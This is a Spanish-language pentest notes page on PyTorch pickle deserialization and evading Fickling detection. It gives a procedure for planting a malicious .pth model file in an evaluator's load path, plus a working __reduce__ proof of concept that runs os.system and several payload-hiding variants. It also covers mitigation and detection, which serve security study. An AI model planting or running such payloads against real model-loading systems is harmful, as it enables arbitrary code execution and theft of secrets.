---
topic: PyTorch — evasión de detección de pickles
tags: [ai, pytorch, pickle, fickling, deserialization]
---

# PyTorch — evasión de detección de pickles

[🌐 English](pytorch-pickle-evasion.en.md) | **Español**

## Concepto

`torch.load` usa pickle y puede ejecutar código al cargar un modelo. Las herramientas como Fickling inspeccionan el bytecode, pero un archivo `.pth` puede usar `runpy` o imports legítimos para ejecutar código durante la importación y pasar la comprobación.

## Cuándo aplica

- Un evaluador carga modelos con `torch.load` o `import torch` sobre rutas controladas.
- El proceso corre como root o con acceso a secretos.
- La detección se basa solo en Fickling o firmas de opcodes.

## Procedimiento

1. Identificar el punto de carga y el usuario del proceso.
2. Construir un `.pth` que ejecute código al importarse.
3. Comprobar que la herramienta de detección no lo marca.
4. Colocarlo en la ruta que consume el evaluador y esperar la ejecución.

## Comandos

```bash
# .pth que se ejecuta al importar el modelo
python3 - <<'PY'
import torch
class Evil:
    def __reduce__(self):
        return (__import__("os").system, ("id",))
torch.save(Evil(), "evil.pth")
PY
fickling evil.pth
# Carga segura
python3 -c "import torch; torch.load('model.pth', weights_only=True)"
```

## Variantes

- Usar `runpy.run_path` dentro de una Lambda o un `__setstate__`.
- Ocultar el payload en un módulo legítimo importado por el modelo.
- Aprovechar un `state_dict` con una clase personalizada.

## Limitaciones

- `weights_only=True` bloquea la mayoría de los payloads.
- El evaluador puede ejecutarse en un contenedor sin privilegios.
- Fickling actualizado puede detectar más patrones.

## Mitigación

- Cargar solo pesos con `weights_only=True`.
- Usar Safetensors o formatos sin código.
- Ejecutar el evaluador sin privilegios y sin secretos.

## Detección

- Modelos que importan módulos o lanzan procesos al cargarse.
- Archivos `.pth` con opcodes de `os.system` o `runpy`.
- Evaluadores que crean procesos hijos inesperados.

## Referencias

- [PyTorch — Security](https://pytorch.org/docs/stable/notes/security.html)
- [Fickling — GitHub](https://github.com/trailofbits/fickling)
- [0xdf — Blurry](https://0xdf.gitlab.io/2024/10/12/htb-blurry.html)
